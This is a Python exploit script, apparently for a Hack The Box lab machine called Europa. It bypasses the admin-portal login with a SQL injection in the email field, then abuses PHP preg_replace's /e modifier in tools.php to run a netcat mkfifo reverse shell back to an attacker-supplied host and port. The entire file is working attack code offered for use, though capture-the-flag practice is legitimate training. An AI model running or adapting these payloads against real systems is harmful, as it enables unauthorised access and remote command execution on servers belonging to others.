#!/usr/bin/python
#Exploiting "preg_replace() PHP function"

from colorama import init,Fore
import requests
import time
import sys
import urllib3
from pwn import *

init()


url = "https://admin-portal.europacorp.htb/login.php"
exploit_url = "https://admin-portal.europacorp.htb/tools.php"
burp = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}



def usage():
	print Fore.RED+"[!] Usage : python %s <lhost> <lport>" % (sys.argv[0])

def main(lhost, lport):
	#BANNER
	print "\n"
	print Fore.YELLOW+"-"*70
	print Fore.GREEN+"[!] auto_europaCorp_PWN!!"
	print Fore.YELLOW+"-"*70
	print "\n"

	print Fore.RED+"[!]** SET NETCAT LISTENING ON PORT "+ lport
	print "\n"
	s = None
	urllib3.disable_warnings()
	s = requests.session()
	s.verify = False
	s.keep_alive = False

	try:


	#EXPLOIT LOGIN SQLI
		post_data={

			'email' : "admin@europacorp.htb'order by 5-- -",
			'password' : 'asd'

		}

		p1 = log.progress("Injecting SQL")
		time.sleep(2)
		r = s.post(url, data=post_data)
		p1.success("LOGED!!")
		time.sleep(2)

	except:
		print "[!] ERROR"
		sys.exit(1)


	#REV_SHELL EXPLOIT

	try:
		payload = "system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc " + lhost + " " + lport +" >/tmp/f\")"
		post_data_pwn={

			'pattern' : '/ip_address/e',
			'ipaddress' : payload,
			'text' : 'openvpn: "vtun0": {"remote-address": "ip_address",}}'
		}
		p2 = log.progress("SENDING rev_shell")
		time.sleep(2)
		p2.success("PWNED!! rev_shell as: www-data")
		r = s.post(exploit_url, data=post_data_pwn)

	except:
		print "[!] ERROR"
		sys.exit(1)

if __name__ == '__main__':

	if len(sys.argv) == 3:
		lhost = sys.argv[1]
		lport = sys.argv[2]
		main(lhost, lport)
	else:
		usage()

